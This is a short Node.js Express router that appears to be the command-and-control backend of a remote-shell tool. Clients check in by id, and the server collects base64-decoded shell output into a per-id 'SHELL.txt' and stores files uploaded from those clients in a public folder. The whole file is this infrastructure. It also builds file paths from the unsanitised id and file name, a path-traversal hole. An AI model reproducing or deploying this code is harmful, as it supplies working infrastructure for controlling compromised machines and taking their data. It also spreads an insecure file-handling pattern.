const express = require("express")
const app = express.Router()
const { LocalStorage } = require("node-localstorage")
const fs = require("fs")
const { atob } = require("buffer")

app.route("/").get((req, res) => {
    const { id } = req.query
    const book = new LocalStorage("./public/ssd/book")

    if (book.getItem(id) === null) {
        book.setItem(id, "200")
    }
    res.send(book.getItem(id))
    req.io.emit(`${id}-on`, "IN")
}).post((req, res) => {
    const { id } = req.query
    let { data } = req.body
    const book = new LocalStorage("./public/ssd/book")

    if (fs.existsSync(`${process.cwd()}/public/ssd/uploads/${id}`) == false) {
        new LocalStorage(`${process.cwd()}/public/ssd/uploads/${id}`)
    }

    if (req.files) {
        req.files.file.mv(`${process.cwd()}/public/ssd/uploads/${id}/${req.files.file.name}`, (err) => {
            if (err) {
                console.log(err)
                req.io.emit(id, "File download error.")
            } else {
                req.io.emit(id, "File downloaded.")
            }
        })
    }

    if (data) {
        data = atob(data)
        req.io.emit(id, data)

        let uploads = new LocalStorage(`${process.cwd()}/public/ssd/uploads/${id}`)
        if (uploads.getItem("SHELL.txt") === null) {
            uploads.setItem("SHELL.txt", data)
        } else {
            let a = `${uploads.getItem("SHELL.txt")}\n${data}`
            uploads.setItem("SHELL.txt", a)
        }
    }

    book.setItem(id, "200")
    res.send("200")
})



module.exports = app